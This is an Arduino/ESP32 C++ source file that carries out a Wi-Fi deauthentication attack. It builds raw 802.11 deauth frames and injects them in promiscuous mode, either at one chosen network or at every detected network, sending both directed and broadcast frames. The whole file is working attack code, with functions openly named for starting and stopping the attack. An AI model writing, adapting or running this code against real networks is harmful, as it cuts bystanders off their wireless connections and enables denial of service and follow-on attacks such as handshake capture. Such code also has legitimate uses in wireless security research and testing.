#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include "definitions.h"

// Global deauth variable
int deauth_type = DEAUTH_TYPE_NONE;

// Deauth frame structure
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t da[6];
    uint8_t sa[6];
    uint8_t bssid[6];
    uint16_t sequence_control;
    uint16_t reason_code;
} deauth_frame_t;

// Send deauth frame
void send_deauth_frame(uint8_t* target_mac, uint8_t* bssid, uint16_t reason) {
    deauth_frame_t frame;
    frame.frame_control = 0xC000;
    frame.duration = 0;
    memcpy(frame.da, target_mac, 6);
    memcpy(frame.sa, bssid, 6);
    memcpy(frame.bssid, bssid, 6);
    frame.sequence_control = 0;
    frame.reason_code = reason;
    
    esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
    delay(1);
}

// Sniffer callback
void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (deauth_type == DEAUTH_TYPE_NONE) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    
    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        // Send deauth to selected network only
        if (networks.size() > 0) {
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
                send_deauth_frame(networks[0].bssid, networks[0].bssid, 1);
                send_deauth_frame((uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", networks[0].bssid, 1);
            }
        }
    }
    else if (deauth_type == DEAUTH_TYPE_ALL) {
        // Send deauth to all detected networks
        for (size_t n = 0; n < networks.size() && n < 10; n++) {
            for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
                send_deauth_frame(networks[n].bssid, networks[n].bssid, 1);
                send_deauth_frame((uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF", networks[n].bssid, 1);
            }
        }
    }
    
    DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 NUM_FRAMES_PER_DEAUTH,
                 networks.size() > 0 ? networks[0].bssid[0] : 0,
                 networks.size() > 0 ? networks[0].bssid[1] : 0,
                 networks.size() > 0 ? networks[0].bssid[2] : 0,
                 networks.size() > 0 ? networks[0].bssid[3] : 0,
                 networks.size() > 0 ? networks[0].bssid[4] : 0,
                 networks.size() > 0 ? networks[0].bssid[5] : 0);
    
    BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}

// Start deauth attack
void start_deauth(int wifi_number, int type, uint16_t reason) {
    stop_deauth();
    deauth_type = type;
    
    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        DEBUG_PRINT("Starting Deauth-Attack on network: ");
        if (wifi_number < networks.size()) {
            DEBUG_PRINTLN(networks[wifi_number].ssid);
        }
    }
    else if (deauth_type == DEAUTH_TYPE_ALL) {
        DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    }
    
    // Enable promiscuous mode
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    esp_wifi_set_channel(curr_channel, WIFI_SECOND_CHAN_NONE);
}

// Stop deauth attack
void stop_deauth() {
    DEBUG_PRINTLN("Stopping Deauth-Attack..");
    esp_wifi_set_promiscuous(false);
    deauth_type = DEAUTH_TYPE_NONE;
}
